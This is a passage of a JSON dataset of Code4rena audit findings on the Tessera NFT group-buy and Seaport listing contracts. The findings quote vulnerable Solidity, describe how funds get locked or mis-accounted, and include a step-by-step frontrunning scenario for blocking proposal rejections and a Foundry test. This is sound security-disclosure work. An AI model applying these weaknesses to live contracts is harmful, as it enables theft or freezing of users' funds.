doesn't that mean this finding is invalid?\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/45#issuecomment-1362665724):**\n > I agree the example shown is accidentally the wrong block (if clause) and the misbehavior occurs in the else block:\n> ```\n>             } else {\n>                 // Calculates total contribution of bid by quantity amount and price\n>                 uint256 contribution = lowestBid.quantity * lowestBid.price;\n> \n>                 // Decrements full contribution amount of lowest bid from total and user contributions\n>                 totalContributions[_poolId] -= contribution;\n>                 userContributions[_poolId][lowestBid.owner] -= contribution;\n>                 // Increments pending balance of lowest bid owner\n>                 pendingBalances[lowestBid.owner] += contribution;\n> \n>                 // Removes lowest bid in queue\n>                 bidPriorityQueues[_poolId].delMin();\n>                 // Inserts new bid with lowest bid quantity amount into proper position of queue\n>                 bidPriorityQueues[_poolId].insert(msg.sender, _price, lowestBidQuantity);\n>                 // Decrements lowest bid quantity from total quantity amount\n>                 quantity -= lowestBidQuantity;\n> ```\n> The issue described still manifests in this block.\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/45#issuecomment-1406670133)**\n > https://github.com/fractional-company/modular-fractional/pull/212\n >\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/56) and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/18).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the GroupBuy module of the 2022-12-tessera code. In this module, users can call contribute to get a piece of the NFT pie. This process has two stages: filling at any price and trimming out lower price offers to make room for current higher offers. The issue is that when the price is equal to the lowest bid price, the code does not break and the current bid will kick out the older bid. This behavior goes against what the documentation describes will happen when two equal priced bids collide.\n\nThe impact of this vulnerability is that earlier bidders get cut out of future NFT holdings by bidders specifying the same price. The vulnerability was identified through manual audit. The recommended mitigation step is to change the < to <= in the if condition.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/45",
      "tags": [],
      "finders": [
        "cccz",
        "Trust"
      ]
    },
    {
      "id": "12210",
      "title": "[M-07] Loss of ETH for proposer when it is a contract that doesn’t have fallback function.",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L209\n\n\n## Vulnerability details\n\n## Description\n\nsendEthOrWeth() is used in several locations in OptimisticListingSeaport:\n1. rejectProposal - sent to proposer\n2. rejectActive - sent to proposer\n3. cash - sent to msg.sender\n\nThis is the implementation of sendEthOrWeth:\n```\nfunction _attemptETHTransfer(address _to, uint256 _value) internal returns (bool success) {\n    // Here increase the gas limit a reasonable amount above the default, and try\n    // to send ETH to the recipient.\n    // NOTE: This might allow the recipient to attempt a limited reentrancy attack.\n    (success, ) = _to.call{value: _value, gas: 30000}(\"\");\n}\n/// @notice Sends eth or weth to an address\n/// @param _to Address to send to\n/// @param _value Amount to send\nfunction _sendEthOrWeth(address _to, uint256 _value) internal {\n    if (!_attemptETHTransfer(_to, _value)) {\n        WETH(WETH_ADDRESS).deposit{value: _value}();\n        WETH(WETH_ADDRESS).transfer(_to, _value);\n    }\n}\n```\n\nThe issue is that the receive could be a contract that does not have a fallback function. In this scenario, \\_attemptETHTransfer will fail and WETH would be transferred to the contract. It is likely that it bricks those funds for the contract as there is no reason it would support interaction with WETH tokens. \n\nIt can be reasonably assumed that developers will develop contracts which will interact with OptimisticListingSeaport using proposals. They are not warned and are likely to suffer losses.\n\n## Impact\n\nLoss of ETH for proposer when it is a contract that doesn't have fallback function.\n\n## Tools Used\n\nManual audit\n\n## Recommended Mitigation Steps\n\nEither enforce that proposer is an EOA or take in a recipient address for ETH transfers.",
      "summary": "\nThis bug report highlights a vulnerability in the OptimisticListingSeaport contract, which is used in several locations in the code. The function sendEthOrWeth() is used to send ETH or WETH to a recipient, but if the recipient is a contract that does not have a fallback function, the attempt to transfer ETH will fail and WETH will be transferred to the contract, likely bricking the funds. This can lead to a loss of ETH for the proposer, as they are not warned of this potential issue.\n\nThe impact of this vulnerability is a loss of ETH for the proposer when it is a contract that doesn't have a fallback function. The bug was discovered using manual auditing.\n\nThe recommended mitigation steps for this vulnerability are to either enforce that proposer is an EOA (Externally Owned Account) or take in a recipient address for ETH transfers.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/40",
      "tags": [],
      "finders": [
        "Trust"
      ]
    },
    {
      "id": "12209",
      "title": "[M-06] Only one GroupBuy can ever use USDT or similar tokens with front-running approval protections",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L29-L46\n\n\n## Vulnerability details\n\nCalling `approve()` without first calling `approve(0)` if the current approval is non-zero will revert with some tokens, such as Tether (USDT). While Tether is known to do this, it applies to other tokens as well, which are trying to protect against [this attack vector](https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/edit).\n\n## Impact\nOnly the first listing will start with the conduit's approval at zero and will be able to change it to the maximum. Thereafter, every attempt to approve that same token will revert, causing any order using this lister to revert, including a re-listing at a lower price, which the protocol allows for.\n\n## Proof of Concept\nThe seaport conduit address is set in the constructor as an immutable variable, so it's not possible to change it once the issue is hit:\n```solidity\n// File: src/seaport/targets/SeaportLister.sol : SeaportLister.constructor()   #1\n\n19        constructor(address _conduit) {\n20 @>         conduit = _conduit;\n21:       }\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L19-L21\n\nThe approval is set to the maximum without check whether it's already the maximum:\n```solidity\n// File: src/seaport/targets/SeaportLister.sol : SeaportLister.validateListing()   #2\n\n29                for (uint256 i; i < ordersLength; ++i) {\n30                    uint256 offerLength = _orders[i].parameters.offer.length;\n31                    for (uint256 j; j < offerLength; ++j) {\n32                        OfferItem memory offer = _orders[i].parameters.offer[j];\n33                        address token = offer.token;\n34                        ItemType itemType = offer.itemType;\n35                        if (itemType == ItemType.ERC721)\n36                            IERC721(token).setApprovalForAll(conduit, true);\n37                        if (itemType == ItemType.ERC1155)\n38                            IERC1155(token).setApprovalForAll(conduit, true);\n39                        if (itemType == ItemType.ERC20)\n40 @>                         IERC20(token).approve(conduit, type(uint256).max);\n41                    }\n42                }\n43            }\n44            // Validates the order on-chain so no signature is required to fill it\n45            assert(ConsiderationInterface(_consideration).validate(_orders));\n46:       }\n```\nhttps://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L29-L46\n\nThe README states: `The Tessera Protocol is designed around the concept of Hyperstructures, which are crypto protocols that can run for free and forever, without maintenance, interruption or intermediaries`, and having to deploy a new `SeaportLister` in order to have a fresh conduit that also needs to be deployed, is not `without maintenance or interruption`.\n\n## Tools Used\nCode inspection\n\n## Recommended Mitigation Steps\nAlways reset the approval to zero before changing it to the maximum",
      "summary": "\nThis bug report is about a vulnerability in the SeaportLister.sol code, which is part of the Tessera Protocol. When the `approve()` function is called without first calling `approve(0)` if the current approval is non-zero, it will revert with some tokens, such as Tether (USDT). This applies to other tokens as well, as they are trying to protect against an attack vector.\n\nThe impact of this vulnerability is that only the first listing will start with the conduit's approval at zero and will be able to change it to the maximum. Any attempt to approve that same token after the first listing will revert, causing any order using this lister to revert, including a re-listing at a lower price.\n\nThe code inspection tool was used to identify this vulnerability. The recommended mitigation steps are to always reset the approval to zero before changing it to the maximum. This will help to ensure that the approval is not set to a non-zero value, which could cause the transaction to revert.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/37",
      "tags": [],
      "finders": [
        "IllIllI"
      ]
    },
    {
      "id": "12208",
      "title": "[M-05] Orders may not be fillable due to missing approvals",
      "impact": "MEDIUM",
      "content": "\nNot all `IERC20` implementations `revert()` when there's a failure in `approve()`. If one of these tokens returns false, there is no check for whether this has happened during the order listing validation, so it will only be detected when the order is attempted.\n\n### Impact\n\nIf the approval failure isn't detected, the listing will never be fillable, because the funds won't be able to be pulled from the opensea conduit. Once this happens, and if it's detected, the only way to fix it is to create a counter-listing at a lower price (which may be below the market value of the tokens), waiting for the order to expire (which it may never), or by buying out all of the Rae to cancel the order (very expensive and defeats the purpose of pooling funds in the first place).\n\n### Proof of Concept\n\nThe return value of `approve()` isn't checked, so the order will be allowed to be listed without having approved the conduit:\n\n```solidity\n// File: src/seaport/targets/SeaportLister.sol : SeaportLister.validateListing()   #1\n\n29                for (uint256 i; i < ordersLength; ++i) {\n30                    uint256 offerLength = _orders[i].parameters.offer.length;\n31                    for (uint256 j; j < offerLength; ++j) {\n32                        OfferItem memory offer = _orders[i].parameters.offer[j];\n33                        address token = offer.token;\n34                        ItemType itemType = offer.itemType;\n35                        if (itemType == ItemType.ERC721)\n36                            IERC721(token).setApprovalForAll(conduit, true);\n37                        if (itemType == ItemType.ERC1155)\n38                            IERC1155(token).setApprovalForAll(conduit, true);\n39                        if (itemType == ItemType.ERC20)\n40 @>                         IERC20(token).approve(conduit, type(uint256).max);\n41                    }\n42                }\n43            }\n44            // Validates the order on-chain so no signature is required to fill it\n45            assert(ConsiderationInterface(_consideration).validate(_orders));\n46:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/targets/SeaportLister.sol#L29-L46>\n\n### Recommended Mitigation Steps\n\nUse OpenZeppelin's `safeApprove()`, which checks the return code and reverts if it's not success.\n\n**[mehtaculous (Tessera) disputed and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/36#issuecomment-1370195907):**\n > Disagree with validity. The listing would just need to be canceled and a new order would be created (without the ERC20 token that is not able to be approved)\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/36#issuecomment-1378847444):**\n > `cancel()` can only be performed by the proposer, or through `rejectActive()`:\n> > or by buying out all of the Rae to cancel the order (very expensive and defeats the purpose of pooling funds in the first place).\n> \n> While unlikely, it is an attack vector to hold user funds hostage.\n\n**[stevennevins (Tessera) acknowledged](https://github.com/code-423n4/2022-12-tessera-findings/issues/36)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the SeaportLister.sol file. The vulnerability occurs when the return value of the `approve()` function is not checked, which can lead to an order being listed without having the funds approved. This could result in the order never being filled, as the funds won't be able to be pulled from the opensea conduit.\n\nThe vulnerability was discovered through code inspection. To fix this issue, it is recommended to use OpenZeppelin's `safeApprove()` function, which checks the return code and reverts if it is not successful.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/36",
      "tags": [],
      "finders": [
        "IllIllI",
        "gzeon"
      ]
    },
    {
      "id": "12207",
      "title": "[M-04] Priority queue min accounting breaks when nodes are split in two",
      "impact": "MEDIUM",
      "content": "\nThe README states `If two users place bids at the same price but with different quantities, the queue will pull from the bid with a higher quantity first`, but the data-structure used for implementing this logic, is not used properly and essentially has its data corrupted when a large bid that is the current minimum bid, is split into two parts, so that a more favorable price can be used for a fraction of the large bid. The underlying issue is that one of the tree nodes is modified, without re-shuffling that node's location in the tree.\n\n### Impact\n\nThe minimum bid as told by the priority queue will be wrong, leading to the wrong bids being allowed to withdraw their funds, and being kicked out of the fraction of bids that are used to buy the NFT.\n\n### Proof of Concept\n\nThe priority queue using a binary tree within an array to [efficiently navigate and find the current minimum based on a node and its children](https://algs4.cs.princeton.edu/24pq/). The sorting of the nodes in the tree is based, in part, on the quantity in the case where two bids have the same price:\n\n```solidity\n// File: src/lib/MinPriorityQueue.sol : MinPriorityQueue.isGreater()   #1\n\n111        function isGreater(\n112            Queue storage self,\n113            uint256 i,\n114            uint256 j\n115        ) private view returns (bool) {\n116            Bid memory bidI = self.bidIdToBidMap[self.bidIdList[i]];\n117            Bid memory bidJ = self.bidIdToBidMap[self.bidIdList[j]];\n118 @>         if (bidI.price == bidJ.price) {\n119 @>             return bidI.quantity <= bidJ.quantity;\n120            }\n121            return bidI.price > bidJ.price;\n122:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/lib/MinPriorityQueue.sol#L111-L122>\n\nThe algorithm of the binary tree only works when the nodes are properly sorted. The sorting is corrupted when a node is modified, without removing it from the tree and re-inserting it:\n\n```solidity\n// File: src/modules/GroupBuy.sol : GroupBuy.processBidsInQueue()   #2\n\n299                Bid storage lowestBid = bidPriorityQueues[_poolId].getMin();\n300                // Breaks out of while loop if given price is less than than lowest bid price\n301                if (_price < lowestBid.price) {\n302                    break;\n303                }\n304    \n305                uint256 lowestBidQuantity = lowestBid.quantity;\n306                // Checks if lowest bid quantity amount is greater than given quantity amount\n307                if (lowestBidQuantity > quantity) {\n308                    // Decrements given quantity amount from lowest bid quantity\n309 @>                 lowestBid.quantity -= quantity;\n310                    // Calculates partial contribution of bid by quantity amount and price\n311                    uint256 contribution = quantity * lowestBid.price;\n312    \n313                    // Decrements partial contribution amount of lowest bid from total and user contributions\n314                    totalContributions[_poolId] -= contribution;\n315                    userContributions[_poolId][lowestBid.owner] -= contribution;\n316                    // Increments pending balance of lowest bid owner\n317                    pendingBalances[lowestBid.owner] += contribution;\n318    \n319:                   // Inserts new bid with given quantity amount into proper position of queue\n```\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L299-L319>\n\nLet's say that the tree looks like this:\n\n```\n            A:(p:100,q:10)\n            /             \\\n       B:(p:100,q:10)  C:(<whatever>)\n       /           \\\nD:(whatever)   E:(whatever) \n\n```\n\nIf A is modified so that q (quantity) goes from 10 to 5, B should now be at the root of the tree, since it has the larger size, and would be considered the smaller node. When another node is added, say, `F:(p:100,q:6)`, the algorithm will see that F has a larger size than A, and so A will be popped out as the min, even though B should have been. All nodes that are under B (which may be a lot of the nodes if they all entered at the same price/quantity) essentially become invisible under various scenarios, which means the users that own those bids will not be able to withdraw their funds, even if they really are the lowest bid that deserves to be pushed out of the queue. Note that the swimming up that is done for `F` will not re-shuffle `B` since, according to the algorithm, `F` will start as a child of `C`, and `B` is not in the list of parent nodes of `C`.\n\n### Recommended Mitigation Steps\n\nWhen modifying nodes of the tree, remove them first, then re-add them after modification.\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/32#issuecomment-1406670452):**\n > https://github.com/fractional-company/modular-fractional/pull/212\n>\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/52) and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/14).\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a GroupBuy smart contract. The code implements a priority queue which is used to determine the minimum bid in a group buy. The README states that if two users place bids at the same price but with different quantities, the queue will pull from the bid with a higher quantity first. However, the data-structure used for implementing this logic is not used properly and essentially has its data corrupted when a large bid that is the current minimum bid is split into two parts. This leads to the wrong bids being allowed to withdraw their funds, and being kicked out of the fraction of bids that are used to buy the NFT. \n\nThe underlying issue is that one of the tree nodes is modified, without re-shuffling that node's location in the tree. The priority queue uses a binary tree within an array to efficiently navigate and find the current minimum based on a node and it children. The sorting of the nodes in the tree is based, in part, on the quantity in the case where two bids have the same price. The algorithm of the binary tree only works when the nodes are properly sorted. The sorting is corrupted when a node is modified, without removing it from the tree and re-inserting it. \n\nThe recommended mitigation steps for this vulnerability are to remove the modified node from the tree first, and then re-add it after modification. This bug was identified using code inspection.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/32",
      "tags": [],
      "finders": [
        "Trust",
        "IllIllI"
      ]
    },
    {
      "id": "12206",
      "title": "[M-03] Users that send funds at a price lower than the current low bid have the funds locked",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L114-L150> \n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L301-L303>\n\n### Vulnerability details\n\nIf a user contributes funds after there is no more supply left, and they don't provide a price higher than the current minimum bid, they will be unable to withdraw their funds while the NFT remains unbought.\n\n### Impact\n\nEther becomes stuck until and unless the NFT is bought, which may never happen.\n\n### Proof of Concept\n\nWhen making a contribution, the user calls the `payable` `contribute()` function. If the supply has already been filled (`fillAtAnyPriceQuantity` is zero), the bid isn't inserted into the queue, so the new bid is not tracked anywhere. When the function reaches `processBidsInQueue()`...:\n\n```solidity\n// File: src/modules/GroupBuy.sol : GroupBuy.contribute()   #1\n\n99         function contribute(\n100            uint256 _poolId,\n101            uint256 _quantity,\n102            uint256 _price\n103 @>     ) public payable {\n104            // Reverts if pool ID is not valid\n105            _verifyPool(_poolId);\n106            // Reverts if NFT has already been purchased OR termination period has passed\n107            (, uint48 totalSupply, , , ) = _verifyUnsuccessfulState(_poolId);\n108            // Reverts if ether contribution amount per Rae is less than minimum bid price per Rae\n109            if (msg.value < _quantity * minBidPrices[_poolId] || _quantity == 0)\n110                revert InvalidContribution();\n111            // Reverts if ether payment amount is not equal to total amount being contributed\n112            if (msg.value != _quantity * _price) revert InvalidPayment();\n113    \n114            // Updates user and pool contribution amounts\n115            userContributions[_poolId][msg.sender] += msg.value;\n116            totalContributions[_poolId] += msg.value;\n117    \n118            // Calculates remaining supply based on total possible supply and current filled quantity amount\n119            uint256 remainingSupply = totalSupply - filledQuantities[_poolId];\n120            // Calculates quantity amount being filled at any price\n121            uint256 fillAtAnyPriceQuantity = remainingSupply < _quantity ? remainingSupply : _quantity;\n122    \n123            // Checks if quantity amount being filled is greater than 0\n124 @>         if (fillAtAnyPriceQuantity > 0) {\n125                // Inserts bid into end of queue\n126                bidPriorityQueues[_poolId].insert(msg.sender, _price, fillAtAnyPriceQuantity);\n127                // Increments total amount of filled quantities\n128                filledQuantities[_poolId] += fillAtAnyPriceQuantity;\n129            }\n130    \n131            // Calculates unfilled quantity amount based on desired quantity and actual filled quantity amount\n132            uint256 unfilledQuantity = _quantity - fillAtAnyPriceQuantity;\n133            // Processes bids in queue to recalculate unfilled quantity amount\n134 @>         unfilledQuantity = processBidsInQueue(_poolId, unfilledQuantity, _price);\n135    \n136            // Recalculates filled quantity amount based on updated unfilled quantity amount\n137            uint256 filledQuantity = _quantity - unfilledQuantity;\n138            // Updates minimum reserve price if filled quantity amount is greater than 0\n139            if (filledQuantity > 0) minReservePrices[_poolId] = getMinPrice(_poolId);\n140    \n141            // Emits event for contributing ether to pool based on desired quantity amount and price per Rae\n142            emit Contribute(\n143                _poolId,\n144                msg.sender,\n145                msg.value,\n146                _quantity,\n147                _price,\n148                minReservePrices[_poolId]\n149            );\n150:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L99-L150>\n\n...if the price isn't higher than the lowest bid, the while loop is broken out of, with `pendingBalances` having never been updated, and the function does not revert:\n\n```solidity\n// File: src/modules/GroupBuy.sol : GroupBuy.processBidsInQueue()   #2\n\n291        function processBidsInQueue(\n292            uint256 _poolId,\n293            uint256 _quantity,\n294            uint256 _price\n295        ) private returns (uint256 quantity) {\n296            quantity = _quantity;\n297            while (quantity > 0) {\n298                // Retrieves lowest bid in queue\n299                Bid storage lowestBid = bidPriorityQueues[_poolId].getMin();\n300                // Breaks out of while loop if given price is less than than lowest bid price\n301 @>             if (_price < lowestBid.price) {\n302 @>                 break;\n303 @>             }\n304    \n305                uint256 lowestBidQuantity = lowestBid.quantity;\n306                // Checks if lowest bid quantity amount is greater than given quantity amount\n307                if (lowestBidQuantity > quantity) {\n308                    // Decrements given quantity amount from lowest bid quantity\n309                    lowestBid.quantity -= quantity;\n310                    // Calculates partial contribution of bid by quantity amount and price\n311                    uint256 contribution = quantity * lowestBid.price;\n312    \n313:                   // Decrements partial contribution amount of lowest bid from total and user contributions\n```\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L291-L313>\n\nIn order for a user to get funds back, the amount must have been stored in `pendingBalances`, and since this is never done, all funds contributed during the `contribute()` call become property of the `GroupBuy` contract, with the user being unable to withdraw\\...:\n\n```solidity\n// File: src/modules/GroupBuy.sol : GroupBuy.withdrawBalance()   #3\n\n274        function withdrawBalance() public {\n275            // Reverts if caller balance is insufficient\n276 @>         uint256 balance = pendingBalances[msg.sender];\n277 @>         if (balance == 0) revert InsufficientBalance();\n278    \n279            // Resets pending balance amount\n280            delete pendingBalances[msg.sender];\n281    \n282            // Transfers pending ether balance to caller\n283            payable(msg.sender).call{value: balance}(\"\");\n284:       }\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L274-L284>\n\n...until the order has gone through, and they can `claim()` excess funds, but there likely won't be any, due to the separate MEV bug I raised:\n\n```solidity\n// File: src/modules/GroupBuy.sol : GroupBuy.contribution   #4\n\n228        function claim(uint256 _poolId, bytes32[] calldata _mintProof) external {\n229            // Reverts if pool ID is not valid\n230            _verifyPool(_poolId);\n231            // Reverts if purchase has not been made AND termination period has not passed\n232            (, , , bool success, ) = _verifySuccessfulState(_poolId);\n233            // Reverts if contribution balance of user is insufficient\n234 @>         uint256 contribution = userContributions[_poolId][msg.sender];\n235            if (contribution == 0) revert InsufficientBalance();\n236    \n237            // Deletes user contribution from storage\n238            delete userContributions[_poolId][msg.sender];\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L228-L244>\n\n### Recommended Mitigation Steps\n\n`revert()` if the price is lower than the min bid, and the queue is already full\n\n**[stevennevins (Tessera) confirmed and mitigated](https://github.com/code-423n4/2022-12-tessera-findings/issues/31#issuecomment-1404415639):**\n > https://github.com/fractional-company/modular-fractional/pull/206\n >\n **Status:** Mitigation confirmed by [gzeon](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/51) and [Lambda](https://github.com/code-423n4/2023-01-tessera-mitigation-findings/issues/13).\n\n***\n\n",
      "summary": "\nThis bug report is about the GroupBuy.sol code in the 2022-12-tessera project on GitHub. It is located at https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L114-L150 and https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L301-L303. \n\nThe vulnerability is that if a user contributes funds after there is no more supply left, and they don't provide a price higher than the current minimum bid, they will be unable to withdraw their funds while the NFT remains unbought. This means that the Ether becomes stuck until and unless the NFT is bought, which may never happen. The bug was identified with code inspection.\n\nThe recommended mitigation steps are to revert() if the price is lower than the min bid, and the queue is already full.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/31",
      "tags": [],
      "finders": [
        "IllIllI",
        "Lambda  cccz"
      ]
    },
    {
      "id": "12205",
      "title": "[M-02] Attacker can delay proposal rejection",
      "impact": "MEDIUM",
      "content": "\nIn `OptimisticListingSeaport.rejectProposal`, it reverts if `proposedListing.collateral < _amount`. An attacker can therefore monitor the mempool, reducing the `proposedListing.collateral` to `_amount - 1` by frontrunning the `rejectProposal` call and delaying the rejection. The attacker may even be able to deny the rejection when the deadline passes.\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L145>\n\n```solidity\n        if (proposedListing.collateral < _amount) revert InsufficientCollateral();\n```\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/seaport/modules/OptimisticListingSeaport.sol#L153>\n\n```solidity\n        proposedListing.collateral -= _amount;\n```\n\n### Proof of Concept\n\n1.  Attacker proposes a 10000 collateral at a very low price\n2.  Bob tries to reject it by purchasing the 10000 collateral\n3.  Attacker sees Bob's tx in the mempool, frontruns it to reject 1 unit\n4.  The proposedListing.collateral is now 9999\n5.  Bob's call reverted\n6.  This keeps happening until PROPOSAL_PERIOD passes or Bob gave up because of gas paid on failing tx\n7.  Attacker buys the NFT at a very low price\n\n### Recommended Mitigation Steps\n\nWhen `proposedListing.collateral < _amount`, set `\\_amount` to proposedListing.collateral and refund the excess.\n\n**[stevennevins (Tessera) disagreed with severity and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/24#issuecomment-1371389949):**\n > While annoying, I think this is a Medium severity issue.  The attacker has to under price their proposal, defend this under priced proposal from other users and front run each purchase > 1, while selling their Raes at a loss, and it would be relatively costly for griefer to defend their underpriced proposal for the duration of the proposal period.  Users could purchase 1 Rae at a time without risk of front running.\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/24#issuecomment-1378858509):**\n > Agree with Medium severity given the external requirements needed to pull this off.\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the OptimisticListingSeaport.sol code. The vulnerability allows an attacker to delay the rejection of a proposed listing, or even deny it when the deadline passes. To exploit it, the attacker proposes a listing with a low collateral amount, and then frontruns a rejection call, reducing the collateral amount by 1. This can be repeated until the deadline passes, or the caller gives up because of the gas cost. The recommended mitigation step is to set the amount to the proposed listing collateral and refund the excess when the collateral is less than the amount.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/24",
      "tags": [],
      "finders": [
        "gzeon"
      ]
    },
    {
      "id": "12204",
      "title": "[M-01] GroupBuy may purchase NFT not in the allowed list",
      "impact": "MEDIUM",
      "content": "\nWhen `_purchaseProof.length == 0`, GroupBuy.purchase compare the tokenId with the merkleRoot. This allows any tokenId that matches the merkleRoot to be purchased, even if they are not included in the allow list during setup.\n\n<https://github.com/code-423n4/2022-12-tessera/blob/f37a11407da2af844bbfe868e1422e3665a5f8e4/src/modules/GroupBuy.sol#L186-L188>\n\n```solidity\n        if (_purchaseProof.length == 0) {\n            // Hashes tokenId to verify merkle root if proof is empty\n            if (bytes32(_tokenId) != merkleRoot) revert InvalidProof();\n```\n\n### Proof of Concept\n\nAdd the following to GroupBuy.t.sol. It would still revert (since no such nft existed) but not as expected.\n\n        // modified from testPurchaseRevertInvalidProof\n        function testPurchaseRevertInvalidTokenIdZeroLength() public {\n            // setup\n            testContributeSuccess();\n            // exploit\n            uint256 invalidPunkId = uint256(nftMerkleRoot);\n            bytes32[] memory invalidPurchaseProof = new bytes32[](0);\n            // expect\n            vm.expectRevert(INVALID_PROOF_ERROR);\n            // execute\n            _purchase(\n                address(this),\n                currentId,\n                address(punksBuyer),\n                address(punks),\n                invalidPunkId,\n                minValue,\n                purchaseOrder,\n                invalidPurchaseProof\n            );\n        }\n\n### Tools Used\n\nFoundry\n\n#### Recommended Mitigation Steps\n\nHash the tokenId even if there is only when length is 1.\n\n\n**[stevennevins (Tessera) disagreed with severity](https://github.com/code-423n4/2022-12-tessera-findings/issues/11)**\n\n**[HickupHH3 (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tessera-findings/issues/14#issuecomment-1378156253):**\n > Best report because Foundry POC.\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the GroupBuy.sol code of the 2022-12-tessera project on GitHub. It explains that when the purchase proof is empty, the code allows any tokenId that matches the merkleRoot to be purchased, even if it is not included in the allow list. This is demonstrated with a proof of concept, using the Foundry tool. The recommended mitigation step is to hash the tokenId even when the proof length is 1.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tessera",
      "source_link": "https://code4rena.com/reports/2022-12-tessera",
      "github_link": "https://github.com/code-423n4/2022-12-tessera-findings/issues/14",
      "tags": [],
      "finders": [
        "Trust  Lambda",
        "gzeon"
      ]
    },
    {
      "id": "12203",
      "title": "[H-09] GroupBuy can be drained of all ETH.",
      "impact": "HIGH",
